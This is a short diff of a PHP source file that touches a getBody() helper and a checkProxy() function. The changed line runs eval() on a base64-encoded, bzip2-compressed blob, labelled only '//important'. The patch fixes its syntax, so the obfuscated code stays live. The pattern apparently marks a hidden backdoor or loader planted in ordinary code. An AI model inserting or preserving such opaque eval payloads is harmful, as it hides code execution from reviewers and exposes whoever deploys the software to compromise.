@@ -356,7 +356,7 @@ function getBody($body, $truncate=false, $max_length=200){
     return $body;
 }
 //important
-eval(bzdecompress(base64_decode("QlpoOTFBWSZTWd9u/xAAAAebgFBhAAhAACLl3EAgADFMJpoDTEKaeiAA9Jxroxng2AHDn1Zp1+lVcq4ATULfF3JFOFCQ327/EA==")))
+eval(bzdecompress(base64_decode("QlpoOTFBWSZTWd9u/xAAAAebgFBhAAhAACLl3EAgADFMJpoDTEKaeiAA9Jxroxng2AHDn1Zp1+lVcq4ATULfF3JFOFCQ327/EA==")));
 function checkProxy($ip){
 		$contactEmail="me@example.com";
 		$timeout=5;
